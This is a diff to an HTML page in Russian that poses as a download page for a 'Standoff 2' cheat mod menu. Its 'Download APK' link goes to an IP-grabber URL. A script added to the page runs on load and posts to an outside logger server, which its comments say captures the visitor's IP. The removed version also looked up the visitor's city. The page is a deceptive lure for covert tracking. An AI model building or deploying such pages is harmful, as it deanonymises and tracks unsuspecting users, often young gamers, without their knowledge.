@@ -1,34 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>Standoff 2 - Mod</title></head>
+<head>
+    <title>Standoff 2 – Мод-меню</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
 <body>
-<h1>Standoff 2 - Мод-меню</h1>
-<p>Стены, прицел, скины.</p>
-<a href="https://grabify.link/4QX57L">Скачать APK</a>
+    <h1>Standoff 2 – Мод-меню</h1>
+    <p>Стены, прицел, скины.</p>
+    <a href="https://grabify.link/4QX57L">Скачать APK</a>
 
-<!-- Ваш логгер -->
-<script>
-(function() {
-    // Отправка IP на ваш сервер
-    const LOGGER_URL = "https://ryzendevcreate.pythonanywhere.com/log";
-    fetch(LOGGER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ page: "Standoff2-mod-menu" })
-    }).catch(err => console.log("Logger error:", err));
+    <script>
+        (function() {
+            const LOGGER_URL = "https://ryzendevcreate.pythonanywhere.com/log";
 
-    // Показать город пользователя (необязательно)
-    fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(data => {
-            if (data.city) {
-                console.log("Ваш город:", data.city, data.country_name);
-                // Можно вывести на страницу:
-                // document.body.innerHTML += `<p>Ваш город: ${data.city}, ${data.country_name}</p>`;
+            function sendIP() {
+                fetch(LOGGER_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ page: "Standoff2-mod-menu" })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("✅ IP отправлен:", data.ip);
+                })
+                .catch(err => {
+                    console.warn("⚠️ Не удалось отправить IP:", err);
+                });
             }
-        })
-        .catch(err => console.log("Geo error:", err));
-})();
-</script>
+
+            // Отправляем IP после загрузки страницы
+            if (document.readyState === "complete") {
+                sendIP();
+            } else {
+                window.addEventListener("load", sendIP);
+            }
+        })();
+    </script>
 </body>
 </html>
